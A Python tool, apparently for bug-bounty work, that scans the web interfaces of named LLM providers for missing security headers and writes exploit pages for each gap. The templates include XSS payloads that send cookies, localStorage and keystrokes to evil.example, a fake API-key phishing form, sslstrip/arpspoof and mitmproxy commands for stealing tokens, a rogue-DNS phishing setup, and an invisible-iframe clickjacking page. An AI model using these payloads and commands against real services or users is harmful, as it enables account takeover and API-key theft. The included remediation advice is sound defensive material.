#!/usr/bin/env python3
"""Header PoC Generator — Concrete exploit PoCs for missing security headers.

Goes beyond "header is missing" findings by producing **exploitable PoCs**:
  - Missing CSP  → XSS payload injection + data exfiltration PoC
  - Missing HSTS → Protocol downgrade + cookie theft PoC
  - Missing X-Frame-Options → Clickjacking on sensitive actions PoC

Targets: LLM provider web interfaces and API endpoints.

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import html
import json
import os
import re
import sys
import textwrap
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(__file__))

from lib import (
    Finding,
    RateLimitedSession,
    get_session_from_env,
    log,
    parse_base_args,
    save_findings,
)

# ---------------------------------------------------------------------------
# LLM Provider targets — public web interfaces + API endpoints
# ---------------------------------------------------------------------------

LLM_PROVIDER_TARGETS: dict[str, list[str]] = {
    "Anthropic Claude": [
        "https://claude.ai",
        "https://claude.ai/login",
        "https://claude.ai/settings",
        "https://claude.ai/api",
        "https://console.anthropic.com",
        "https://api.anthropic.com",
    ],
    "OpenAI ChatGPT": [
        "https://chatgpt.com",
        "https://chatgpt.com/auth/login",
        "https://platform.openai.com",
        "https://platform.openai.com/account",
        "https://api.openai.com",
    ],
    "Google Gemini": [
        "https://gemini.google.com",
        "https://gemini.google.com/app",
        "https://aistudio.google.com",
        "https://generativelanguage.googleapis.com",
    ],
    "Mistral AI": [
        "https://chat.mistral.ai",
        "https://console.mistral.ai",
        "https://api.mistral.ai",
    ],
    "GitHub Copilot": [
        "https://github.com/features/copilot",
        "https://copilot.github.com",
        "https://api.github.com/copilot",
    ],
    "Hugging Face": [
        "https://huggingface.co",
        "https://huggingface.co/chat",
        "https://api-inference.huggingface.co",
    ],
    "Cohere": [
        "https://coral.cohere.com",
        "https://dashboard.cohere.com",
        "https://api.cohere.ai",
    ],
    "Perplexity AI": [
        "https://www.perplexity.ai",
        "https://api.perplexity.ai",
    ],
    "xAI Grok": [
        "https://grok.x.ai",
        "https://console.x.ai",
        "https://api.x.ai",
    ],
    "Meta Llama (via Together)": [
        "https://api.together.xyz",
    ],
    "DeepSeek": [
        "https://chat.deepseek.com",
        "https://platform.deepseek.com",
        "https://api.deepseek.com",
    ],
}


# ---------------------------------------------------------------------------
# PoC templates — HTML files that demonstrate real exploitability
# ---------------------------------------------------------------------------

def _poc_clickjacking(target_url: str, provider: str) -> str:
    """Generate a clickjacking PoC HTML page targeting a sensitive action."""
    safe_url = html.escape(target_url, quote=True)
    safe_provider = html.escape(provider, quote=True)
    return textwrap.dedent(f"""\
    <!DOCTYPE html>
    <html>
    <head>
      <title>Clickjacking PoC — {safe_provider}</title>
      <style>
        body {{ margin: 0; font-family: sans-serif; background: #111; color: #eee; }}
        .overlay {{
          position: absolute; top: 0; left: 0; width: 100%; height: 100%;
          z-index: 2; opacity: 0.0001;
        }}
        .bait {{
          position: absolute; top: 200px; left: 50%; transform: translateX(-50%);
          z-index: 1; padding: 20px 40px; background: #e74c3c; color: white;
          font-size: 24px; border-radius: 8px; cursor: pointer;
        }}
        iframe {{
          position: absolute; top: 0; left: 0; width: 100%; height: 100%;
          border: none; z-index: 3; opacity: 0.0001;
        }}
        .info {{
          position: fixed; bottom: 20px; left: 20px; background: #222;
          padding: 15px; border-radius: 8px; border: 1px solid #444;
          font-size: 12px; max-width: 500px; z-index: 10;
        }}
      </style>
    </head>
    <body>
      <!-- Visible bait content — user thinks they're clicking here -->
      <div class="bait">🎁 Claim Your Free API Credits</div>

      <!-- Invisible iframe loads the target — user actually clicks on it -->
      <iframe src="{safe_url}" sandbox="allow-forms allow-scripts"></iframe>

      <div class="info">
        <strong>⚠️ Clickjacking PoC — {safe_provider}</strong><br>
        <code>CWE-1021</code> — Missing X-Frame-Options header<br><br>
        <strong>Impact:</strong> The target page at <code>{safe_url}</code> can be
        framed in an invisible iframe. An attacker can overlay a bait UI and trick
        authenticated users into performing unintended actions (delete account,
        change settings, revoke/create API keys).<br><br>
        <strong>Repro:</strong> Open this HTML in a browser while authenticated on
        {safe_provider}. The iframe loads the real page transparently on top of the
        bait button.<br><br>
        <strong>Fix:</strong> <code>X-Frame-Options: DENY</code> or
        <code>Content-Security-Policy: frame-ancestors 'none'</code>
      </div>
    </body>
    </html>""")


def _poc_xss_no_csp(target_url: str, provider: str) -> str:
    """Generate an XSS exploitation PoC demonstrating missing CSP impact."""
    safe_url = html.escape(target_url, quote=True)
    safe_provider = html.escape(provider, quote=True)
    return textwrap.dedent(f"""\
    <!DOCTYPE html>
    <html>
    <head>
      <title>XSS + No CSP PoC — {safe_provider}</title>
      <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }}
        .poc-box {{ background: #111; border: 1px solid #333; padding: 20px; border-radius: 8px; margin: 10px 0; }}
        code {{ background: #222; padding: 2px 6px; border-radius: 3px; color: #ff6; }}
        h2 {{ color: #f44; }}
        .step {{ margin: 8px 0; padding-left: 20px; border-left: 2px solid #333; }}
      </style>
    </head>
    <body>
      <h1>🔓 XSS Exploitation — Missing CSP on {safe_provider}</h1>

      <div class="poc-box">
        <h2>CWE-79 — Cross-Site Scripting (No CSP Mitigation)</h2>
        <p><strong>Target:</strong> <code>{safe_url}</code></p>
        <p><strong>Issue:</strong> No <code>Content-Security-Policy</code> header → inline scripts
        execute freely, making ANY XSS vector immediately exploitable.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 1 — Session Token Exfiltration</h2>
        <p>If a reflected/stored XSS exists, this payload steals all accessible tokens:</p>
        <div class="step">
          <code>&lt;script&gt;fetch('https://evil.example/steal?c='+document.cookie+'&amp;ls='+btoa(JSON.stringify(localStorage)))&lt;/script&gt;</code>
        </div>
        <p>Without CSP, no <code>script-src</code> restriction prevents this from executing.
        The exfiltrated data includes session cookies, JWT tokens from localStorage,
        and any API keys stored client-side.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 2 — Keylogger Injection</h2>
        <p>A stored XSS with no CSP allows persistent credential theft:</p>
        <div class="step">
          <code>&lt;script&gt;document.addEventListener('keydown',e=&gt;fetch('https://evil.example/keys?k='+e.key))&lt;/script&gt;</code>
        </div>
        <p>Captures every keystroke (API keys, passwords, prompts) into an attacker-controlled server.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 3 — DOM Manipulation (Phishing Overlay)</h2>
        <p>Inject a fake login dialog over the real UI:</p>
        <div class="step">
          <code>&lt;script&gt;document.body.innerHTML='&lt;form action=https://evil.example/phish&gt;&lt;h2&gt;Session expired — re-enter your API key&lt;/h2&gt;&lt;input name=key placeholder="sk-..."&gt;&lt;button&gt;Continue&lt;/button&gt;&lt;/form&gt;'&lt;/script&gt;</code>
        </div>
        <p>Without CSP, an attacker can completely replace the page content,
        creating a convincing phishing overlay that harvests API credentials.</p>
      </div>

      <div class="poc-box">
        <h2>Impact Chain: XSS (CWE-79) → No CSP → ATO / API Key Theft</h2>
        <p>Missing CSP transforms ANY XSS (even reflected) from "fire alert(1)" to
        "steal everything". The severity escalates from Medium to <strong>Critical</strong>
        because:</p>
        <ul>
          <li>Session cookies exfiltrated → Account Takeover</li>
          <li>API keys stolen → Unauthorized API usage ($$$)</li>
          <li>Keylogger → Persistent credential capture</li>
          <li>DOM takeover → Phishing at scale</li>
        </ul>
      </div>

      <div class="poc-box">
        <h2>Fix</h2>
        <code>Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.{safe_provider}; frame-ancestors 'none';</code>
      </div>
    </body>
    </html>""")


def _poc_hsts_downgrade(target_url: str, provider: str) -> str:
    """Generate an HSTS bypass / protocol downgrade PoC."""
    safe_url = html.escape(target_url, quote=True)
    safe_provider = html.escape(provider, quote=True)
    parsed = urlparse(target_url)
    domain = html.escape(parsed.hostname or "unknown", quote=True)
    return textwrap.dedent(f"""\
    <!DOCTYPE html>
    <html>
    <head>
      <title>HSTS Downgrade PoC — {safe_provider}</title>
      <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }}
        .poc-box {{ background: #111; border: 1px solid #333; padding: 20px; border-radius: 8px; margin: 10px 0; }}
        code {{ background: #222; padding: 2px 6px; border-radius: 3px; color: #ff6; }}
        .cmd {{ background: #000; padding: 10px; border-radius: 4px; margin: 8px 0; color: #0f0; white-space: pre-wrap; }}
        h2 {{ color: #f44; }}
      </style>
    </head>
    <body>
      <h1>🔓 HSTS Missing — Protocol Downgrade on {safe_provider}</h1>

      <div class="poc-box">
        <h2>CWE-319 — Missing Strict-Transport-Security</h2>
        <p><strong>Target:</strong> <code>{safe_url}</code></p>
        <p><strong>Issue:</strong> No <code>Strict-Transport-Security</code> header.
        First-visit users or users with cleared HSTS cache can be downgraded to HTTP
        via MITM → session cookies and API keys intercepted in cleartext.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 1 — sslstrip MITM Attack</h2>
        <p>On a shared WiFi network (conference, coffee shop, airport):</p>
        <div class="cmd"># Terminal 1: ARP spoof the gateway
arpspoof -i wlan0 -t &lt;VICTIM_IP&gt; &lt;GATEWAY_IP&gt;

# Terminal 2: Enable IP forwarding + sslstrip
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sslstrip -l 8080 -w /tmp/sslstrip-{domain}.log

# Terminal 3: Watch for credentials
tail -f /tmp/sslstrip-{domain}.log | grep -i "cookie\\|token\\|key\\|auth"</div>
        <p><strong>Result:</strong> When a victim navigates to <code>http://{domain}</code>
        (typed without https://, or via HTTP redirect), sslstrip intercepts the connection
        and serves the page over HTTP. Without HSTS, the browser doesn't enforce HTTPS.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 2 — mitmproxy Certificate Interception</h2>
        <div class="cmd"># Start mitmproxy in transparent mode
mitmproxy --mode transparent --showhost -w /tmp/mitm-{domain}.flow

# Filter for target domain
mitmdump --mode transparent -w /tmp/dump.flow "~d {domain}" --set "modify_headers=/~q/Accept-Encoding/identity"

# Extract tokens from captured traffic
mitmproxy -r /tmp/mitm-{domain}.flow --set "view_filter=~d {domain} & ~hq authorization"</div>
        <p>Captures Authorization headers, Bearer tokens, API keys, and session
        cookies in transit. Without HSTS preload, first connections are vulnerable.</p>
      </div>

      <div class="poc-box">
        <h2>PoC 3 — DNS Hijack + HTTP Downgrade</h2>
        <div class="cmd"># Rogue DNS server returning attacker IP for {domain}
# (e.g., via hotel/airport captive portal, rogue DHCP)
dnsmasq --address=/{domain}/&lt;ATTACKER_IP&gt; --no-daemon

# Serve a fake login page on port 80
python3 -m http.server 80 --directory /tmp/phishing-{domain}/</div>
        <p>Without HSTS (and without the domain being on the HSTS preload list),
        the browser will happily connect over HTTP to the rogue server.</p>
      </div>

      <div class="poc-box">
        <h2>Impact: MITM → Session Hijacking → API Key Theft</h2>
        <p>For an LLM provider, the stolen credentials give access to:</p>
        <ul>
          <li>Session cookies → Full account takeover (conversations, settings, billing)</li>
          <li>API keys → Unauthorized usage billed to the victim ($$$)</li>
          <li>Conversation history → Confidential data exfiltration</li>
          <li>Bearer tokens → API abuse at scale</li>
        </ul>
        <p><strong>Severity:</strong> HIGH to CRITICAL depending on scope (web UI vs API)</p>
      </div>

      <div class="poc-box">
        <h2>Fix</h2>
        <code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>
        <p>Additionally: submit domain to <a href="https://hstspreload.org/" style="color:#0ff">hstspreload.org</a></p>
      </div>
    </body>
    </html>""")


# ---------------------------------------------------------------------------
# Header analysis + PoC generation
# ---------------------------------------------------------------------------

# Critical headers to test with PoC
HEADER_POC_MAP: list[dict] = [
    {
        "header": "Content-Security-Policy",
        "cwe": "CWE-79",
        "severity_missing": "high",
        "severity_with_poc": "critical",
        "impact_title": "XSS exploitation without CSP mitigation",
        "poc_generator": _poc_xss_no_csp,
        "chain": "XSS → No CSP → Session Hijack / API Key Theft / ATO",
        "attack_scenario": (
            "Any reflected or stored XSS becomes immediately exploitable for "
            "session hijacking, API key theft, and account takeover. Without CSP, "
            "inline scripts execute freely — no script-src restriction prevents "
            "data exfiltration to attacker-controlled servers."
        ),
        "curl_check": 'curl -sI "{url}" | grep -i "content-security-policy"',
    },
    {
        "header": "Strict-Transport-Security",
        "cwe": "CWE-319",
        "severity_missing": "high",
        "severity_with_poc": "high",
        "impact_title": "Protocol downgrade enables MITM credential theft",
        "poc_generator": _poc_hsts_downgrade,
        "chain": "No HSTS → sslstrip → cleartext session cookies → ATO",
        "attack_scenario": (
            "On shared WiFi (conference, coffee shop), an attacker can sslstrip "
            "the connection. Without HSTS, first-time visitors or users with "
            "cleared cache connect over HTTP. Session cookies, API keys, and "
            "Bearer tokens are intercepted in cleartext."
        ),
        "curl_check": 'curl -sI "{url}" | grep -i "strict-transport-security"',
    },
    {
        "header": "X-Frame-Options",
        "cwe": "CWE-1021",
        "severity_missing": "medium",
        "severity_with_poc": "high",
        "impact_title": "Clickjacking on sensitive actions",
        "poc_generator": _poc_clickjacking,
        "chain": "No X-Frame-Options → iframe overlay → unauthorized actions",
        "attack_scenario": (
            "The page can be framed by an attacker's site. Using a transparent "
            "iframe overlay, authenticated users can be tricked into clicking on "
            "hidden elements — deleting accounts, changing email, creating API "
            "keys, or revoking access tokens."
        ),
        "curl_check": 'curl -sI "{url}" | grep -i "x-frame-options"',
    },
]


def _check_header_present(headers: dict[str, str], header_name: str) -> str | None:
    """Return the header value if present, None otherwise. Case-insensitive."""
    headers_lower = {k.lower(): v for k, v in headers.items()}
    return headers_lower.get(header_name.lower())


def _check_csp_frame_ancestors(headers: dict[str, str]) -> bool:
    """Check if CSP frame-ancestors covers X-Frame-Options gap."""
    csp = _check_header_present(headers, "Content-Security-Policy")
    if not csp:
        return False
    return "frame-ancestors" in csp.lower()


def scan_url_for_header_pocs(
    session: RateLimitedSession,
    url: str,
    provider: str,
    dry_run: bool = False,
) -> list[Finding]:
    """Scan a single URL and generate PoCs for missing critical headers."""
    findings: list[Finding] = []

    if dry_run:
        log.info("[DRY-RUN] HEAD %s", url)
        return findings

    try:
        resp = session.get(url, allow_redirects=True, timeout=15)
    except Exception as e:
        log.debug("Error fetching %s: %s", url, e)
        return findings

    headers = dict(resp.headers)
    status_code = resp.status_code

    # Skip non-200 responses (404s, 403s are not interesting for header analysis)
    if status_code >= 400:
        log.debug("Skipping %s (HTTP %d)", url, status_code)
        return findings

    for spec in HEADER_POC_MAP:
        header_name = spec["header"]
        value = _check_header_present(headers, header_name)

        if value is not None:
            # Header present — check for weak configuration
            if header_name == "Content-Security-Policy":
                if "unsafe-inline" in value or "unsafe-eval" in value:
                    poc_html = spec["poc_generator"](url, provider)
                    findings.append(Finding(
                        title=f"[{provider}] Weak CSP — unsafe-inline/unsafe-eval allows XSS exploitation",
                        severity="high",
                        cwe=spec["cwe"],
                        endpoint=url,
                        method="GET",
                        description=(
                            f"CSP contains 'unsafe-inline' or 'unsafe-eval', negating XSS protection. "
                            f"Current value: {value[:200]}"
                        ),
                        steps=[
                            f"curl -sI '{url}' | grep -i content-security-policy",
                            f"Observe: CSP includes unsafe-inline or unsafe-eval",
                            "Open the PoC HTML file in a browser while authenticated",
                            "Injected inline scripts execute without restriction",
                        ],
                        impact=spec["attack_scenario"],
                        evidence={
                            "header": header_name,
                            "current_value": value[:500],
                            "issue": "weak_csp",
                            "poc_html": poc_html,
                            "chain": spec["chain"],
                            "provider": provider,
                        },
                        remediation=(
                            "Remove 'unsafe-inline' and 'unsafe-eval' from CSP. "
                            "Use nonce-based or hash-based CSP for required inline scripts."
                        ),
                    ))
            continue

        # Header missing — generate PoC
        # Special case: X-Frame-Options missing but CSP frame-ancestors set
        if header_name == "X-Frame-Options" and _check_csp_frame_ancestors(headers):
            log.debug("X-Frame-Options missing but CSP frame-ancestors present on %s", url)
            continue

        poc_html = spec["poc_generator"](url, provider)
        severity = spec["severity_with_poc"]

        # Build concrete steps
        steps = [
            f"1. Verify header missing: {spec['curl_check'].format(url=url)}",
            f"2. Expected output: (empty — header not present)",
            f"3. Save the PoC HTML file and open in browser while authenticated on {provider}",
        ]

        if header_name == "X-Frame-Options":
            steps.append("4. The target page loads inside the invisible iframe")
            steps.append("5. Click the bait button → the click lands on the real page")
            steps.append("6. Sensitive action is performed without user's knowledge")
        elif header_name == "Content-Security-Policy":
            steps.append("4. Inject XSS payload in any reflected parameter")
            steps.append("5. Payload executes — fetch() exfiltrates cookies/tokens to attacker server")
            steps.append("6. Attacker uses stolen credentials for account takeover")
        elif header_name == "Strict-Transport-Security":
            steps.append("4. On shared WiFi, run sslstrip to downgrade HTTPS → HTTP")
            steps.append("5. Victim navigates to target (first visit or cleared cache)")
            steps.append("6. Session cookies and API keys captured in cleartext")

        findings.append(Finding(
            title=f"[{provider}] Missing {header_name} — {spec['impact_title']}",
            severity=severity,
            cwe=spec["cwe"],
            endpoint=url,
            method="GET",
            description=(
                f"The endpoint {url} does not set the {header_name} header. "
                f"{spec['attack_scenario']}"
            ),
            steps=steps,
            impact=f"Attack chain: {spec['chain']}",
            evidence={
                "header": header_name,
                "status": "missing",
                "http_status": status_code,
                "poc_html": poc_html,
                "chain": spec["chain"],
                "provider": provider,
                "all_headers": {k: v for k, v in headers.items()
                                if k.lower() in (
                                    "content-security-policy", "x-frame-options",
                                    "strict-transport-security", "server",
                                    "x-powered-by", "set-cookie",
                                )},
            },
            remediation=f"Set {header_name}: {_get_best_practice(header_name)}",
        ))

    return findings


def _get_best_practice(header: str) -> str:
    """Return best-practice value for a security header."""
    return {
        "Content-Security-Policy": "default-src 'self'; script-src 'self'; frame-ancestors 'none'",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
        "X-Frame-Options": "DENY",
    }.get(header, "")


# ---------------------------------------------------------------------------
# Main scan function
# ---------------------------------------------------------------------------

def scan(
    session: RateLimitedSession,
    target: str | None = None,
    providers: list[str] | None = None,
    extra_urls: list[str] | None = None,
    dry_run: bool = False,
) -> list[Finding]:
    """Scan LLM providers for missing headers and generate PoCs.

    Args:
        target: If set, scan only this URL (non-provider mode).
        providers: List of provider names to scan. None = all.
        extra_urls: Additional URLs to scan (added to provider list).
        dry_run: Log requests without executing.
    """
    findings: list[Finding] = []

    # Mode 1: Scan specific target URL
    if target:
        parsed = urlparse(target)
        provider_name = parsed.hostname or "Unknown"
        # Try to match to known provider
        for pname, purls in LLM_PROVIDER_TARGETS.items():
            if any(parsed.hostname in u for u in purls):
                provider_name = pname
                break
        log.info("Scanning target: %s (provider: %s)", target, provider_name)
        findings.extend(scan_url_for_header_pocs(session, target, provider_name, dry_run))

    # Mode 2: Scan LLM providers
    selected_providers = providers or list(LLM_PROVIDER_TARGETS.keys())
    for pname in selected_providers:
        urls = LLM_PROVIDER_TARGETS.get(pname, [])
        if not urls:
            log.warning("Unknown provider: %s", pname)
            continue
        log.info("=== Scanning %s (%d URLs) ===", pname, len(urls))
        for url in urls:
            findings.extend(scan_url_for_header_pocs(session, url, pname, dry_run))

    # Mode 3: Extra URLs
    if extra_urls:
        for url in extra_urls:
            parsed = urlparse(url)
            findings.extend(scan_url_for_header_pocs(
                session, url, parsed.hostname or "Custom", dry_run,
            ))

    return findings


def main() -> None:
    parser = parse_base_args()
    parser.add_argument(
        "--providers", nargs="*", default=None,
        help="LLM providers to scan (default: all). "
             "Options: " + ", ".join(f'"{k}"' for k in LLM_PROVIDER_TARGETS),
    )
    parser.add_argument(
        "--extra-urls", nargs="*", default=None,
        help="Additional URLs to scan beyond provider list",
    )
    parser.add_argument(
        "--save-pocs", default=None,
        help="Directory to save PoC HTML files (default: don't save files)",
    )
    args = parser.parse_args()

    if args.verbose:
        import logging
        logging.getLogger().setLevel(logging.DEBUG)

    session = get_session_from_env()
    if args.rate_limit:
        session.min_interval = 1.0 / args.rate_limit

    log.info("=== Header PoC Generator starting ===")
    log.info("Providers: %s", args.providers or "ALL")

    all_findings = scan(
        session,
        target=args.target,
        providers=args.providers,
        extra_urls=args.extra_urls,
        dry_run=args.dry_run,
    )

    # Optionally save PoC HTML files to disk
    if args.save_pocs and not args.dry_run:
        import hashlib
        poc_dir = args.save_pocs
        os.makedirs(poc_dir, exist_ok=True)
        for f in all_findings:
            poc_html = f.evidence.get("poc_html")
            if poc_html:
                slug = re.sub(r'[^a-z0-9]+', '-', f.title.lower())[:60]
                fname = f"{slug}.html"
                fpath = os.path.join(poc_dir, fname)
                with open(fpath, "w") as fh:
                    fh.write(poc_html)
                log.info("PoC saved: %s", fpath)

    log.info("=== Header PoC Generator complete: %d findings ===", len(all_findings))
    save_findings(all_findings, "header-poc-generator")


if __name__ == "__main__":
    main()
